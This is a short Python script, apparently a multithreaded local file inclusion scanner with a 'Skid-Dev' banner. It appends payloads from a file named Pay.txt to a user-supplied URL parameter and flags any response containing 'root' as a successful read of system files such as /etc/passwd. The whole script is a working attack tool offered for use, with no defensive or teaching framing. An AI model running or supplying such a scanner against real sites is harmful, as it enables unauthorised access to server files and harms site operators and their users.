#!/usr/bin/python 
import os
import requests as nabil 
import concurrent.futures 

logo = """\033[0;31;40m  

 @@@      @@@@@@@@ @@@           @@@@@@  @@@@@@@  @@@@@@  @@@  @@@
 @@!      @@!      @@!          !@@     !@@      @@!  @@@ @@!@!@@@
 @!!      @!!!:!   !!@ @!@!@!@!  !@@!!  !@!      @!@!@!@! @!@@!!@!
 !!:      !!:      !!:              !:! :!!      !!:  !!! !!:  !!!
 : ::.: :  :       :            ::.: :   :: :: :  :   : : ::    : 
_____________________________________
author: Skid-Dev
_____________________________________   
github: https://github.com/Knownasjohnn
_____________________________________                                      
"""
os.system('clear')
print(logo)

url = str(input("[+] Enter Url(with param): "))
print("")
if "?" in url:
	url = url 
	o = open("Pay.txt","r").readlines()
else:
	print(f"[+] invalid url(please input url with param): ")
	exit()

def scan(x):
	pay = x.strip()
	url_p = url+pay 
	req = nabil.get(url_p).text 
	if "root" in req:
		print(f"[+] FOUND     : {url_p}")
	else:
		print(f"NOT FOUND : {url_p}")
with concurrent.futures.ThreadPoolExecutor() as exe:
	exe.map(scan,o)